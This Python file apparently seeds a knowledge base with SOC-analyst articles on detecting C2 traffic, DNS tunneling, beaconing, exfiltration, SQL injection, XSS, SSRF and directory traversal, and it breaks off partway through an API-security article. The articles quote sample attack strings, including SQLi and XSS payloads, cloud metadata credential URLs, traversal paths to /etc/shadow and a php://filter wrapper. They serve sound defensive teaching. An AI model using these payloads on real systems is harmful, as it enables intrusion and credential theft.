"""Built-in KB data: Offensive Security — C2, Web & Evasion."""

# ============================================================
# COLLECTION 1: COMMAND & CONTROL AND EXFILTRATION DETECTION
# ============================================================

C2_EXFIL = [
    {
        "title": "C2 Framework Characteristics — Identifying Implant Traffic",
        "tags": ["c2", "command-and-control", "cobalt-strike", "sliver", "T1071", "network-detection"],
        "content": r"""# C2 Framework Characteristics — Identifying Implant Traffic

## Overview

Command and Control (C2) frameworks provide attackers with remote access to compromised hosts. Understanding common C2 traffic characteristics enables SOC analysts to detect implant communications even when operators customize their tooling. This article focuses on detection patterns rather than tool usage.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1071.001 | Application Layer Protocol: Web | Command and Control |
| T1071.004 | Application Layer Protocol: DNS | Command and Control |
| T1573 | Encrypted Channel | Command and Control |
| T1095 | Non-Application Layer Protocol | Command and Control |

## Common C2 Framework Signatures

**Cobalt Strike:** The most widely observed commercial C2 framework in intrusions. Default configurations leave detectable artifacts:

- Default TLS certificates with specific serial numbers and issuer strings
- Malleable C2 profiles still leave metadata patterns in HTTP headers
- Named pipe patterns such as `\\.\pipe\msagent_*` or `\\.\pipe\MSSE-*`
- Default beacon watermark values embedded in the payload configuration
- Check-in intervals typically 60 seconds with 0-25% jitter in default profiles

**Sliver / Mythic / Havoc:** Open-source alternatives share behavioral traits:

- mTLS handshakes with self-signed certificates on non-standard ports
- Protobuf-encoded payloads over HTTP/S with predictable URI structures
- Implant registration messages with host enumeration data on first callback

## Detection Strategies

**Network-Based Indicators:**

- Monitor for periodic connections to the same destination at regular intervals
- Flag TLS connections where the SNI does not match the certificate CN/SAN
- Detect unusually long HTTP POST bodies from internal hosts to external IPs
- Alert on DNS queries with high entropy subdomain labels (possible DNS C2)
- Watch for HTTP responses with consistent body sizes across multiple requests

**Host-Based Indicators:**

- Unusual processes making outbound network connections (e.g., `notepad.exe` connecting externally)
- In-memory loaded DLLs with no corresponding file on disk
- Abnormal parent-child process relationships tied to network activity

## Analyst Checklist

1. Correlate suspicious network flows with endpoint process data
2. Check certificate transparency logs for newly registered domains
3. Look for JA3 hash matches against known C2 fingerprint databases
4. Validate that HTTP User-Agent strings match the actual software version
5. Investigate any internal host communicating with IP-only destinations (no DNS resolution)

## Key Takeaway

C2 frameworks all share a fundamental requirement: periodic communication with a controlled endpoint. Regardless of protocol or encryption, this behavioral pattern creates detection opportunities through traffic analysis, certificate inspection, and endpoint correlation.
""",
    },
    {
        "title": "DNS Tunneling Detection — Identifying Covert Channels in DNS",
        "tags": ["dns-tunneling", "c2", "exfiltration", "T1071.004", "dns", "network-forensics"],
        "content": r"""# DNS Tunneling Detection — Identifying Covert Channels in DNS

## Overview

DNS tunneling encodes data within DNS queries and responses to create a covert communication channel. Because DNS traffic is rarely blocked and often uninspected, attackers use it for C2 callbacks and data exfiltration. Analysts must understand the statistical and structural anomalies that distinguish tunneled DNS from legitimate queries.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1071.004 | Application Layer Protocol: DNS | Command and Control |
| T1048.001 | Exfiltration Over Alternative Protocol: DNS | Exfiltration |
| T1572 | Protocol Tunneling | Command and Control |

## How DNS Tunneling Works

Attackers register a domain (e.g., `evil.example.com`) and run a DNS server for it. The implant encodes data as subdomain labels:

```
aGVsbG8gd29ybGQ.evil.example.com  → TXT query
```

The authoritative DNS server decodes the subdomain, processes the command, and returns the response encoded in DNS record data (TXT, CNAME, MX, or NULL records). Tools like `iodine`, `dnscat2`, and `dns2tcp` automate this process.

## Detection Indicators

**Query-Level Anomalies:**

- Subdomain labels longer than 30 characters (normal subdomains average 8-12 characters)
- High Shannon entropy in subdomain strings (>3.5 bits/character suggests encoding)
- Base32 or Base64 character distributions in query names
- Queries for unusual record types: TXT, NULL, CNAME with encoded payloads
- Single domain receiving an abnormally high query volume from one host

**Session-Level Anomalies:**

- Sustained DNS query rates exceeding 50 queries/minute to one domain
- More than 15 unique subdomains queried for the same parent domain in a short window
- DNS response sizes consistently near the 512-byte UDP limit or using TCP fallback
- Query-response size ratios suggesting bidirectional data transfer

**Infrastructure Indicators:**

- Authoritative nameservers hosted on VPS providers or bulletproof hosting
- Recently registered domains (< 30 days) receiving high query volumes
- Domains with no associated web content or MX records

## Detection Rules (Pseudocode)

```
ALERT "Possible DNS Tunneling" WHEN:
  dns.query.subdomain_length > 30
  AND dns.query.entropy > 3.5
  AND count(unique_subdomains) > 15 per 5 minutes
  AND destination_domain age < 60 days
```

## Investigation Steps

1. Extract the full list of queried subdomains for the suspicious domain
2. Attempt Base32/Base64 decoding of subdomain labels to reveal plaintext
3. Chart query frequency over time — tunneling shows sustained, periodic patterns
4. Check the domain registration date and hosting provider via WHOIS
5. Correlate the source host with endpoint telemetry to identify the tunneling process
6. Calculate bytes transferred by summing query and response payload sizes

## Key Takeaway

DNS tunneling is slow but stealthy. Detection relies on statistical analysis of query patterns — entropy, length, volume, and subdomain diversity — rather than signature matching. Baseline your environment's normal DNS behavior to reduce false positives.
""",
    },
    {
        "title": "HTTP Beaconing Analysis — Detecting Periodic C2 Callbacks",
        "tags": ["beaconing", "c2", "network-analysis", "T1071.001", "traffic-analysis", "detection"],
        "content": r"""# HTTP Beaconing Analysis — Detecting Periodic C2 Callbacks

## Overview

Beaconing is the periodic communication pattern used by implants to check in with their C2 server. Detecting beaconing requires statistical analysis of connection timing, as attackers deliberately add jitter to avoid simple threshold-based alerts. This article covers analytical methods for identifying beaconing in HTTP/S traffic.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1071.001 | Application Layer Protocol: Web Protocols | Command and Control |
| T1573.002 | Encrypted Channel: Asymmetric Cryptography | Command and Control |
| T1029 | Scheduled Transfer | Exfiltration |

## Beaconing Characteristics

**Timing Patterns:**

Implants call back at configured intervals with optional jitter. A 60-second beacon with 10% jitter produces connections every 54-66 seconds. Detection methods must account for this variance:

- **Coefficient of Variation (CV):** Standard deviation divided by mean of inter-arrival times. CV < 0.15 strongly suggests beaconing. Legitimate browsing typically shows CV > 0.5.
- **Frequency Analysis (FFT):** Fast Fourier Transform of connection timestamps reveals dominant frequencies. A clear spectral peak indicates periodic behavior.
- **Histogram Binning:** Group inter-arrival times into bins. Beaconing creates a tight cluster around the beacon interval, while human traffic distributes broadly.

**Content Patterns:**

- Consistent response sizes for idle check-ins (no tasking)
- Small request bodies (heartbeat) followed by occasional large responses (tasking)
- Predictable URI paths or parameter structures across sessions
- Cookie values that remain constant or increment sequentially

## Analysis Methodology

**Step 1 — Filter and Group:**
Group connections by source-destination pair. Focus on long-duration communication relationships (> 4 hours) with high session counts (> 50 connections).

**Step 2 — Calculate Inter-Arrival Times:**
For each source-destination group, compute time deltas between consecutive connections. Remove outliers beyond 3 standard deviations.

**Step 3 — Statistical Tests:**
- Compute CV: values below 0.15 warrant investigation
- Run FFT: look for dominant frequency with high amplitude
- Check for regularity: if 80%+ of intervals fall within 20% of the median, flag as suspicious

**Step 4 — Validate:**
Cross-reference with threat intelligence, check destination reputation, inspect TLS certificate details, and correlate with endpoint telemetry.

## Common False Positives

- Software update checks (Windows Update, antivirus signature pulls)
- Monitoring agents and health-check heartbeats
- Chat applications with persistent connections and keep-alives
- CDN prefetch and analytics beacons

Maintain a whitelist of known periodic services and exclude them from analysis.

## Key Takeaway

Beaconing detection is fundamentally a time-series analysis problem. Focus on the statistical regularity of connection intervals rather than content inspection. Low coefficient of variation combined with long session duration is the strongest indicator of C2 beaconing.
""",
    },
    {
        "title": "Domain Fronting Indicators — Detecting CDN-Based C2 Evasion",
        "tags": ["domain-fronting", "c2", "cdn", "T1090.004", "evasion", "tls-inspection"],
        "content": r"""# Domain Fronting Indicators — Detecting CDN-Based C2 Evasion

## Overview

Domain fronting abuses CDN infrastructure to disguise C2 traffic as connections to legitimate, high-reputation domains. The TLS SNI field shows a trusted domain while the HTTP Host header routes the request to an attacker-controlled origin. Detecting this technique requires comparing TLS and HTTP layer metadata.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1090.004 | Proxy: Domain Fronting | Command and Control |
| T1071.001 | Application Layer Protocol: Web Protocols | Command and Control |
| T1001.003 | Data Obfuscation: Protocol Impersonation | Command and Control |

## How Domain Fronting Works

1. Attacker registers a service on a CDN (e.g., Azure, CloudFront, Fastly)
2. Implant initiates a TLS connection with SNI set to `trusted-site.azureedge.net`
3. After TLS handshake, the HTTP Host header is set to `attacker-service.azureedge.net`
4. The CDN routes the request based on the Host header, reaching the attacker's origin
5. Network monitors see only the trusted domain in the SNI, not the true destination

## Detection Indicators

**TLS/HTTP Mismatch:**

The primary detection method is comparing the TLS SNI with the HTTP Host header. A mismatch where both resolve to the same CDN but reference different services is suspicious. This requires TLS inspection (MITM proxy) to see the Host header inside encrypted traffic.

**Without TLS Inspection:**

- Unusual volume of HTTPS traffic to CDN edge nodes from a single internal host
- Connections to CDN IPs that do not correspond to any business-approved services
- Persistent long-duration sessions to CDN endpoints (legitimate CDN use is typically bursty)
- Traffic patterns matching beaconing intervals to CDN IP ranges
- JA3 fingerprints that do not match the expected browser or application

**CDN-Specific Indicators:**

- Azure: traffic to `*.azureedge.net` or `*.cloudapp.net` without corresponding Azure services
- AWS CloudFront: connections to `*.cloudfront.net` distributions not in your asset inventory
- Google: requests to `*.appspot.com` or `*.googleapis.com` not tied to approved applications
- Fastly / Akamai: similar patterns with their respective edge domains

## Investigation Workflow

1. Inventory approved CDN services and create an allowlist of expected CDN destinations
2. Monitor for internal hosts connecting to CDN IP ranges not in the allowlist
3. If TLS inspection is available, compare SNI vs Host header for mismatches
4. Correlate CDN-bound traffic with endpoint process data to identify the generating application
5. Check if the source process normally makes CDN connections (browser vs unusual binary)
6. Analyze traffic volume and timing patterns for beaconing characteristics

## Mitigation Strategies

- Deploy TLS inspection at the network perimeter for CDN-bound traffic
- Restrict outbound HTTPS to approved domains via proxy allowlists
- Monitor for newly created CDN distributions targeting your CDN provider
- Major CDN providers have begun disabling domain fronting — verify your provider's policy

## Key Takeaway

Domain fronting exploits the trust placed in CDN infrastructure. Detection requires either TLS inspection to compare SNI with Host headers, or behavioral analysis of CDN-bound traffic patterns. Maintaining a CDN service inventory is essential for identifying anomalous connections.
""",
    },
    {
        "title": "Data Exfiltration Patterns — Detecting Unauthorized Data Transfer",
        "tags": ["exfiltration", "data-loss", "T1048", "T1041", "dlp", "network-monitoring"],
        "content": r"""# Data Exfiltration Patterns — Detecting Unauthorized Data Transfer

## Overview

Data exfiltration is the unauthorized transfer of data from a compromised network. Attackers use a variety of channels — from simple HTTP uploads to steganography and cloud storage abuse. Detecting exfiltration requires monitoring data flows for volume anomalies, protocol misuse, and behavioral deviations.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1041 | Exfiltration Over C2 Channel | Exfiltration |
| T1048 | Exfiltration Over Alternative Protocol | Exfiltration |
| T1567 | Exfiltration to Cloud Storage | Exfiltration |
| T1029 | Scheduled Transfer | Exfiltration |
| T1030 | Data Transfer Size Limits | Exfiltration |
| T1537 | Transfer Data to Cloud Account | Exfiltration |

## Exfiltration Channel Categories

**Over C2 Channel (T1041):**
Data sent through the existing implant communication channel. Detected by sudden increases in outbound data volume to C2 destinations.

**Alternative Protocols (T1048):**
- DNS: data encoded in query subdomains (see DNS Tunneling article)
- ICMP: payload data hidden in echo request/reply packets
- SMTP: sensitive data sent as email attachments to external addresses
- FTP/SFTP: bulk file transfers to external servers during off-hours

**Cloud Storage Abuse (T1567):**
- Uploads to Dropbox, Google Drive, OneDrive, Mega, or AWS S3
- Legitimate services make blocking difficult; monitor for unusual upload volumes
- Watch for personal cloud storage use from corporate endpoints

**Physical/Removable Media (T1052):**
- USB drive connections logged via endpoint telemetry
- Large file copy operations to removable media

## Detection Indicators

**Volume-Based:**
- Outbound data transfer exceeding baseline by 2+ standard deviations
- Upload-to-download ratio inversion (normally users download more than upload)
- Single host transferring > 100MB to external destination in one session
- Cumulative transfers to a single external IP exceeding historical norms

**Timing-Based:**
- Large transfers occurring outside business hours (00:00-06:00)
- Scheduled transfers at consistent intervals (T1029)
- Data staging followed by burst transfer patterns

**Protocol-Based:**
- DNS responses larger than 512 bytes or frequent TCP DNS fallback
- ICMP packets with payload sizes exceeding 64 bytes
- HTTP POST requests with bodies > 1MB to non-CDN destinations
- Encrypted traffic to IP addresses with no DNS resolution

## Investigation Playbook

1. Identify the source host and the generating process
2. Determine what data was accessed before the transfer (file access logs)
3. Calculate total data volume transferred and compare to baseline
4. Check destination reputation and categorization
5. Correlate with DLP alerts if available
6. Review authentication logs for the source user account for anomalies
7. Preserve network capture data for forensic analysis

## Key Takeaway

Exfiltration detection combines volume analysis, timing analysis, and protocol analysis. No single method catches all techniques. Layer DLP policies, network flow monitoring, and endpoint telemetry to build comprehensive coverage. Baseline normal data flows to make anomalies visible.
""",
    },
    {
        "title": "JA3 and JA3S Fingerprinting — TLS Client and Server Identification",
        "tags": ["ja3", "ja3s", "tls-fingerprinting", "T1071.001", "network-forensics", "threat-intel"],
        "content": r"""# JA3 and JA3S Fingerprinting — TLS Client and Server Identification

## Overview

JA3 and JA3S are methods for fingerprinting TLS clients and servers based on their handshake parameters. These fingerprints persist regardless of destination IP or domain, making them valuable for identifying malware families, C2 frameworks, and unauthorized applications on the network.

## How JA3/JA3S Works

**JA3 (Client Fingerprint):**
The JA3 hash is computed from five fields in the TLS Client Hello message:
- TLS version
- Accepted cipher suites
- List of extensions
- Elliptic curves (supported groups)
- Elliptic curve point formats

These values are concatenated with commas and hashed with MD5 to produce a 32-character fingerprint.

**JA3S (Server Fingerprint):**
The JA3S hash uses three fields from the TLS Server Hello:
- TLS version selected
- Cipher suite selected
- Extensions included

The JA3/JA3S pair together uniquely identifies a client-server TLS negotiation pattern.

## Detection Applications

**Malware Identification:**
Malware families and C2 frameworks produce consistent JA3 hashes because they use hardcoded or narrowly configured TLS libraries. A single JA3 hash can identify all instances of a malware family regardless of destination infrastructure.

Known C2 JA3 hash databases are maintained by:
- Salesforce (original JA3 creators) on GitHub
- Abuse.ch JA3 fingerprint feed
- JARM (active TLS server fingerprinting, complementary to passive JA3S)

**Unauthorized Software Detection:**
Different applications produce different JA3 hashes. Compare observed hashes against an approved application inventory to detect unauthorized software, VPN clients, or tunneling tools.

**Bot Detection:**
Automated tools (scrapers, credential stuffers) often have JA3 hashes that differ from legitimate browsers, even when spoofing User-Agent headers.

## Implementation

**Capturing JA3 Hashes:**
- Zeek/Bro: native JA3 support via `ja3` package
- Suricata: JA3 logging in EVE JSON output
- Wireshark: JA3 display filter available
- Arkime (Moloch): built-in JA3 field indexing

**Example Detection Rule (Pseudocode):**
```
ALERT "Known Malware JA3" WHEN:
  tls.ja3.hash IN threat_intel.ja3_blocklist
  AND source.ip IN internal_ranges
```

## Limitations

- JA3 hashes change when TLS libraries are updated
- Some legitimate software shares JA3 hashes with malware
- TLS 1.3 reduces fingerprint uniqueness due to fewer negotiated parameters
- Attackers can randomize TLS parameters to evade JA3 matching

## Analyst Workflow

1. Deploy JA3 logging on network sensors (Zeek, Suricata, or NGFW)
2. Build a baseline of JA3 hashes observed in your environment
3. Cross-reference unknown hashes against public threat intelligence feeds
4. Investigate hosts producing JA3 hashes not associated with approved software
5. Combine JA3 with JA3S to identify specific client-server communication pairs
6. Use JARM for active scanning of suspicious external servers

## Key Takeaway

JA3/JA3S fingerprinting provides a network-layer identification method that is independent of IP addresses, domains, or packet contents. It is most effective when combined with a known-good baseline and threat intelligence feeds. While not foolproof, it adds a valuable detection layer that is difficult for attackers to evade without modifying their tooling.
""",
    },
    {
        "title": "Encrypted Traffic Anomalies — Detecting Threats Without Decryption",
        "tags": ["encrypted-traffic", "tls-analysis", "T1573", "network-detection", "metadata-analysis"],
        "content": r"""# Encrypted Traffic Anomalies — Detecting Threats Without Decryption

## Overview

With over 95% of web traffic now encrypted, analysts must detect threats within TLS/SSL sessions without relying on decryption. Metadata analysis — including certificate properties, flow characteristics, and timing patterns — provides detection opportunities that do not require breaking encryption.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1573.001 | Encrypted Channel: Symmetric Cryptography | Command and Control |
| T1573.002 | Encrypted Channel: Asymmetric Cryptography | Command and Control |
| T1071.001 | Application Layer Protocol: Web Protocols | Command and Control |

## Certificate-Based Detection

**Self-Signed Certificates:**
- Certificates where issuer equals subject indicate self-signed certs
- Legitimate services rarely use self-signed certificates for public-facing endpoints
- C2 frameworks often generate self-signed certificates with default or randomized fields

**Certificate Anomalies:**
- Validity periods exceeding 10 years or less than 7 days
- Certificates issued by unknown or uncommon Certificate Authorities
- Subject CN/SAN that does not match the destination hostname
- Certificates with missing or default organization fields
- Recently issued certificates (< 7 days) from free CAs like Let's Encrypt used on suspicious domains

**Certificate Transparency:**
Monitor CT logs for certificates issued for lookalike domains that impersonate your organization. Services like CertStream provide real-time alerting.

## Flow Metadata Analysis

**Session Duration:**
- C2 sessions often maintain persistent connections lasting hours or days
- Legitimate HTTPS sessions are typically short-lived (seconds to minutes)
- Long-lived TLS sessions to external IPs warrant investigation

**Packet Size Distribution:**
- Interactive C2 sessions show bidirectional small packets (shell commands/responses)
- Data exfiltration shows asymmetric flows with large outbound transfers
- Beaconing shows repetitive fixed-size exchanges during idle periods

**Connection Frequency:**
- Multiple short TLS sessions to the same destination at regular intervals suggest beaconing
- Normal browsing shows irregular connection patterns to diverse destinations

## Protocol Anomalies

- TLS connections on non-standard ports (not 443, 8443, or 993)
- TLS version downgrade to SSLv3 or TLS 1.0 (potential tool limitation)
- Cipher suites that do not match any known browser or application
- Missing ALPN extension or unexpected protocol negotiation
- TLS connections immediately following DNS queries to recently registered domains

## Detection Without Decryption — Practical Approach

1. **JA3 Fingerprinting:** Identify client applications by TLS handshake parameters
2. **Certificate Logging:** Extract and catalog server certificates from handshakes
3. **Flow Analysis:** Compute session duration, byte ratios, and packet size distributions
4. **Timing Analysis:** Apply beaconing detection algorithms to TLS connection timestamps
5. **DNS Correlation:** Link TLS destinations to DNS resolution history and domain age

## Key Takeaway

Encrypted traffic analysis relies on metadata, not content. Certificate properties, flow statistics, timing patterns, and TLS handshake fingerprints provide rich detection signals. Build analytics around these metadata fields to maintain visibility in an encrypted environment.
""",
    },
]

# ============================================================
# COLLECTION 2: WEB APPLICATION ATTACK PATTERNS
# ============================================================

WEB_ATTACKS = [
    {
        "title": "SQL Injection Detection — WAF and Log Analysis Patterns",
        "tags": ["sqli", "sql-injection", "T1190", "waf", "web-security", "log-analysis"],
        "content": r"""# SQL Injection Detection — WAF and Log Analysis Patterns

## Overview

SQL injection (SQLi) remains a top web application vulnerability, allowing attackers to manipulate database queries through unsanitized user input. SOC analysts must recognize SQLi patterns in web application firewall (WAF) logs, access logs, and application-level telemetry to detect and respond to injection attempts.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |

## SQLi Categories

**In-Band (Classic):** Results returned directly in the HTTP response. Includes UNION-based (appending extra SELECT statements) and error-based (forcing database errors that leak data).

**Blind SQLi:** No visible output. Boolean-based blind infers data by observing different application responses (true/false). Time-based blind uses `SLEEP()` or `WAITFOR DELAY` to infer data by measuring response times.

**Out-of-Band:** Data exfiltrated via DNS or HTTP requests initiated by the database server (e.g., `xp_cmdshell`, `UTL_HTTP`). Rare but difficult to detect without network monitoring.

## Detection Patterns in Logs

**WAF Log Indicators:**

Watch for these patterns in URI parameters, POST bodies, headers, and cookies:

- SQL keywords in unexpected positions: `UNION SELECT`, `OR 1=1`, `AND 1=1`
- Comment sequences used to truncate queries: `--`, `#`, `/* */`
- String concatenation functions: `CONCAT()`, `||`, `+`
- Time delay functions: `SLEEP(5)`, `WAITFOR DELAY '0:0:5'`, `pg_sleep(5)`
- System table references: `information_schema`, `sysobjects`, `pg_tables`
- Stacked queries using semicolons in parameter values

**URL-Encoded Variants:**

Attackers encode payloads to bypass WAF pattern matching:
- `%27` = single quote, `%23` = hash comment, `%2D%2D` = double dash
- Double encoding: `%2527` decodes to `%27` then to `'`
- Unicode variants: `%u0027` for single quote

**Access Log Patterns:**

- Unusually long query strings containing SQL syntax
- Sequential requests to the same endpoint with incrementally varying payloads (automated tool fingerprint)
- `sqlmap` User-Agent string (though attackers change this)
- Rapid-fire requests to form endpoints with varying parameter values

## Response Indicators

- HTTP 500 errors containing database error messages (MySQL, MSSQL, PostgreSQL, Oracle)
- Response size variations suggesting successful UNION injection
- Response time anomalies indicating time-based blind injection
- Identical requests producing different response codes (boolean-based blind)

## Investigation Steps

1. Extract the full request (URI, headers, body) from WAF or proxy logs
2. URL-decode all parameters to reveal the actual payload
3. Identify which parameter is being targeted
4. Determine the SQLi type (union, boolean blind, time-based, error-based)
5. Check if the injection was successful by examining response data
6. Assess data exposure: what tables/columns could have been accessed
7. Review the source IP for other attack patterns (scanning, brute force)

## Key Takeaway

SQLi detection relies on pattern recognition in web logs. Layered defenses — WAF rules, parameterized queries, input validation, and least-privilege database accounts — reduce risk. Analysts should decode all URL parameters and inspect full request bodies, not just URIs.
""",
    },
    {
        "title": "Cross-Site Scripting Detection — Types, Patterns, and Prevention",
        "tags": ["xss", "cross-site-scripting", "T1189", "web-security", "input-validation", "csp"],
        "content": r"""# Cross-Site Scripting Detection — Types, Patterns, and Prevention

## Overview

Cross-Site Scripting (XSS) attacks inject client-side scripts into web applications viewed by other users. XSS can lead to session hijacking, credential theft, defacement, and malware distribution. Understanding the three XSS types and their detection patterns enables SOC analysts to identify attacks in web logs and WAF telemetry.

## XSS Types

**Reflected XSS:** The injected script is part of the request and reflected back in the response. The victim must click a crafted link. Most common and easiest to detect in access logs because the payload appears in the URL.

**Stored XSS:** The script is permanently stored on the target server (database, forum post, comment field). Every user viewing the stored content executes the script. Harder to detect because the payload is submitted once and triggered repeatedly.

**DOM-Based XSS:** The vulnerability exists in client-side JavaScript that processes user input. The payload never reaches the server, making it invisible to WAF and server-side logging. Detection requires client-side instrumentation or CSP violation reports.

## Detection Patterns

**Log-Based Detection:**

Common XSS payload patterns in URLs and request bodies:
- `<script>` tags and event handlers: `onerror=`, `onload=`, `onmouseover=`
- JavaScript protocol: `javascript:alert()`, `javascript:eval()`
- HTML injection: `<img src=x onerror=...>`, `<svg onload=...>`, `<iframe src=...>`
- Encoded variants: `&#x3C;script&#x3E;`, `%3Cscript%3E`, `\u003cscript\u003e`

**WAF Evasion Techniques to Watch For:**
- Case variations: `<ScRiPt>`, `<SCRIPT>`
- Tag breaking: `<scr<script>ipt>`
- Null bytes: `<scri%00pt>`
- Alternative encodings: HTML entities, Unicode, Base64
- Using lesser-known HTML tags: `<details open ontoggle=...>`, `<marquee onstart=...>`

**CSP Violation Reports:**

Content Security Policy can report XSS attempts. Monitor `report-uri` or `report-to` endpoints for violations indicating script injection attempts. Violations from unexpected inline scripts or unauthorized script sources warrant investigation.

## Impact Assessment

When XSS is confirmed:
1. Determine the XSS type (reflected, stored, DOM-based)
2. Identify affected pages and user populations
3. Check for session token exfiltration (cookies without HttpOnly flag)
4. Review for secondary payloads (keyloggers, cryptocurrency miners, redirects)
5. Assess whether the XSS was used to pivot to other attacks (CSRF, phishing)

## Prevention Controls

- **Input Validation:** Whitelist acceptable characters, reject or sanitize HTML-special characters
- **Output Encoding:** Context-aware encoding (HTML, JavaScript, URL, CSS)
- **Content Security Policy:** Restrict script sources, disable inline scripts and `eval()`
- **HttpOnly Cookies:** Prevent JavaScript access to session tokens
- **X-XSS-Protection / X-Content-Type-Options:** Legacy defense-in-depth headers

## Key Takeaway

XSS detection in server logs focuses on HTML and JavaScript patterns in request parameters. Stored XSS requires monitoring application data stores, and DOM-based XSS needs client-side visibility. CSP is both a prevention mechanism and a detection tool via violation reporting.
""",
    },
    {
        "title": "Server-Side Request Forgery — SSRF Indicators and Detection",
        "tags": ["ssrf", "T1190", "web-security", "cloud-security", "metadata-service"],
        "content": r"""# Server-Side Request Forgery — SSRF Indicators and Detection

## Overview

Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests to unintended destinations, typically internal services or cloud metadata endpoints. SSRF has become critical in cloud environments where the instance metadata service (IMDS) can expose credentials and configuration data.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1552.005 | Cloud Instance Metadata API | Credential Access |

## How SSRF Works

An application that fetches URLs based on user input (e.g., URL preview, PDF generation, webhook configuration) can be abused to:

1. Access internal services not exposed to the internet (databases, admin panels)
2. Read cloud metadata endpoints (`http://169.254.169.254/latest/meta-data/`)
3. Port-scan internal networks through the server
4. Access localhost-bound services on the application server

## Detection Indicators

**Request-Level Patterns:**

Watch for these URL patterns in user-controllable parameters:
- Internal IP ranges: `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`, `127.0.0.1`
- Cloud metadata endpoints: `169.254.169.254`, `metadata.google.internal`
- IPv6 localhost: `[::1]`, `[0:0:0:0:0:0:0:1]`
- Decimal/octal/hex IP encoding: `2130706433` (127.0.0.1 as integer), `0x7f000001`
- URL schema abuse: `file:///etc/passwd`, `gopher://`, `dict://`
- DNS rebinding: domains that resolve to internal IPs after initial validation

**Server-Side Log Indicators:**

- Application server making HTTP requests to internal IP addresses
- Requests to the cloud metadata endpoint from application processes
- DNS resolutions for hostnames that resolve to private IP ranges
- Unexpected outbound connections from web server processes to internal services
- Error responses containing internal service banners or data

**Cloud-Specific SSRF:**

AWS, GCP, and Azure metadata services are primary SSRF targets:
- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/identity/oauth2/token`

IMDSv2 (AWS) requires a PUT request for a session token, mitigating simple GET-based SSRF.

## Investigation Steps

1. Identify the vulnerable parameter accepting URLs or hostnames
2. Review server-side request logs for internal IP destinations
3. Check if cloud credentials were accessed via metadata endpoint
4. Assess what internal services were reachable and whether data was returned
5. Determine if the SSRF was blind (no response data) or full (response reflected)
6. Review CloudTrail/activity logs for credential use from compromised IMDS tokens

## Prevention

- Validate and sanitize user-supplied URLs on the server side
- Implement allowlists for permitted destination domains and IP ranges
- Block requests to private IP ranges and metadata endpoints at the application level
- Use IMDSv2 (token-required) on AWS instances
- Deploy network segmentation to limit server-to-internal-service access

## Key Takeaway

SSRF is particularly dangerous in cloud environments due to metadata service exposure. Detection combines WAF rules for internal IP patterns, server-side request logging, and cloud API monitoring for unauthorized credential access.
""",
    },
    {
        "title": "Directory Traversal Detection — Path Manipulation Attacks",
        "tags": ["directory-traversal", "path-traversal", "T1190", "lfi", "web-security"],
        "content": r"""# Directory Traversal Detection — Path Manipulation Attacks

## Overview

Directory traversal (path traversal) attacks manipulate file path references in web applications to access files outside the intended directory. This can expose configuration files, source code, credentials, and system files. Detection relies on identifying path manipulation sequences in HTTP requests.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |

## Attack Mechanics

Applications that serve files based on user-supplied filenames or paths are vulnerable. The attacker uses relative path sequences to escape the web root:

```
Normal:    GET /files/report.pdf
Traversal: GET /files/../../../etc/passwd
```

The `../` sequence moves up one directory level. Repeated sequences can reach the filesystem root, and from there any readable file.

## Detection Patterns

**Direct Path Sequences:**
- `../` (Unix) and `..\` (Windows) in URL paths and parameters
- URL-encoded variants: `%2e%2e%2f`, `%2e%2e/`, `..%2f`
- Double URL encoding: `%252e%252e%252f`
- Unicode/overlong UTF-8: `%c0%ae%c0%ae%c0%af`
- Null byte injection: `file.pdf%00.jpg` (terminates string in some languages)

**Common Target Files:**

Attackers target known-path files to confirm traversal success:
- Linux: `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, `/etc/hosts`
- Windows: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`
- Application: `web.xml`, `.env`, `config.php`, `appsettings.json`, `.git/config`
- Cloud: credential files, service account keys

**WAF Log Indicators:**
- Multiple requests to the same endpoint with increasing `../` depth
- Requests returning unexpected content types (text/plain from an image endpoint)
- Successful responses to paths containing traversal sequences
- Access to sensitive file paths from web-facing endpoints

## Local File Inclusion (LFI)

LFI extends directory traversal by including the file in server-side processing (e.g., PHP `include()`). This can lead to:
- Source code disclosure
- Log poisoning: inject code into log files, then include the log file
- PHP filter wrapper abuse: `php://filter/convert.base64-encode/resource=config.php`
- Remote code execution when combined with file upload or log injection

## Investigation Steps

1. Decode all URL-encoded characters in the request to reveal traversal sequences
2. Determine if the traversal was successful by examining response size and content
3. Identify what files were accessed and assess data exposure
4. Check for follow-up requests indicating the attacker found credentials
5. Review the application for input validation on file path parameters
6. Look for related attacks: LFI, file upload, or log poisoning attempts

## Prevention

- Validate and canonicalize file paths before use
- Use allowlists for permitted filenames rather than blocklists
- Chroot or sandbox file-serving operations
- Remove path traversal sequences after URL decoding (apply recursively)
- Serve user-uploaded files from a separate domain or storage service

## Key Takeaway

Directory traversal detection centers on identifying `../` sequences and their encoded variants in HTTP requests. Analysts should URL-decode all request components and check for access to sensitive system files. WAF rules should cover multiple encoding schemes to prevent bypass.
""",
    },
    {
        "title": "API Security Flaws — BOLA, IDOR, and Broken Access Control",
        "tags": ["api-security", "bola", "idor", "T1190", "broken-access-control", "owasp"],
        "content": r"""# API Security Flaws — BOLA, IDOR, and Broken Access Control

## Overview

Broken Object Level Authorization (BOLA), also known as Insecure Direct Object Reference (IDOR), is the most critical API security flaw according to the OWASP API Security Top 10. These vulnerabilities allow authenticated users to access or modify resources belonging to other users by manipulating object identifiers in API requests.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
